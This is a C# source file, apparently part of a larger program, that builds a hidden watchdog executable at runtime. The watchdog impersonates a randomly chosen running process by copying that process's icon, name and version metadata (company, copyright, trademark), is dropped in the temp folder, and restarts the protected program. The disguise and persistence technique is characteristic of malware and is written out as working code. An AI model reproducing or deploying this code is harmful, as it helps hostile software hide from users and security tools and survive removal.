using System;
using System.IO;
using System.Diagnostics;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using Microsoft.CSharp;

namespace Application.Watcher
{
    internal sealed class Compiler
    {
        /// <summary>
        /// Compile watchdog and return location
        /// </summary>
        /// <param name="random_process">Process to steal icon, name</param>
        /// <returns>Executable location</returns>
        public static string CompileWatcher(in Process random_process)
        {
            Process protect_process = Process.GetCurrentProcess();
            string iconLocation = ProcessUtils.GrabIcon(random_process);
            string watcherLocation = Path.Combine(Path.GetTempPath(), random_process.ProcessName + ".exe");
            // Replace values
            string source = Properties.Resources.Observer
                .Replace("%WatchDogModule%", random_process.ProcessName)
                .Replace("%ExecutablePath%", ProcessUtils.ProcessExecutablePath(protect_process))
                .Replace("%Arguments%", Watchdog.commandLineArgs.Replace("--restarted", ""))
                .Replace("%ProcessID%", protect_process.Id.ToString())
                .Replace("%Sleep%", new Random().Next(200, 450).ToString())
                .Replace("%AssemblyDescription%", random_process.MainModule.FileVersionInfo.FileDescription)
                .Replace("%AssemblyFileVersion%", random_process.MainModule.FileVersionInfo.FileVersion)
                .Replace("%AssemblyCompany%", random_process.MainModule.FileVersionInfo.CompanyName)
                .Replace("%AssemblyCopyright%", random_process.MainModule.FileVersionInfo.LegalCopyright)
                .Replace("%AssemblyTrademark%", random_process.MainModule.FileVersionInfo.LegalTrademarks)
                .Replace("%Guid%", Guid.NewGuid().ToString());
            // Set options
            string[] referencedAssemblies = new string[] { "System.dll" };
            var providerOptions = new Dictionary<string, string>() { {"CompilerVersion", "v4.0" } };
            var compilerOptions = $"/target:winexe /platform:anycpu /optimize+";
            // Set icon
            if (File.Exists(iconLocation)) 
                compilerOptions += $" /win32icon:\"{iconLocation}\"";
            // Compile
            using (var cSharpCodeProvider = new CSharpCodeProvider(providerOptions))
            {
                var compilerParameters = new CompilerParameters(referencedAssemblies)
                {
                    GenerateExecutable = true,
                    OutputAssembly = watcherLocation,
                    CompilerOptions = compilerOptions,
                    TreatWarningsAsErrors = false,
                    IncludeDebugInformation = false,
                };
                var compilerResults = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters, source);
                // Show errors if exists
                if (compilerResults.Errors.Count > 0)
                    foreach (var error in compilerResults.Errors)
                        Console.WriteLine(error);
            }

            // Clean, return
            if (File.Exists(iconLocation)) File.Delete(iconLocation);
            if (File.Exists(watcherLocation)) return watcherLocation;

            return null;
        }
    }
}
